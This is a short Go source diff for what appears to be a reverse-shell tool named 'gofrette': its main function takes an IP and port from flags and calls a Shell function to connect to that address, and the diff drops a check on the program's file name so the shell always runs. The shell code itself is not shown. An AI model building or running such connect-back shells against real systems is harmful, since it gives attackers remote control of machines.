@@ -1,11 +1,9 @@
 package main
 
 import (
-	s "awesomeProject/gofrette/shell"
 	"flag"
 	"fmt"
-	"os"
-	"strings"
+	s "github.com/gofrette/shell"
 )
 
 func main() {
@@ -14,11 +12,7 @@ func main() {
 	flag.Parse()
 	address := fmt.Sprintf("%s:%d",*ipaddr, *port)
 
-	name := os.Args[0]
-	if strings.Contains(name,"gofrette.exe") {
-		s.Shell(address)
-	}
-	os.Exit(1)
+	s.Shell(address)
 }
 
 
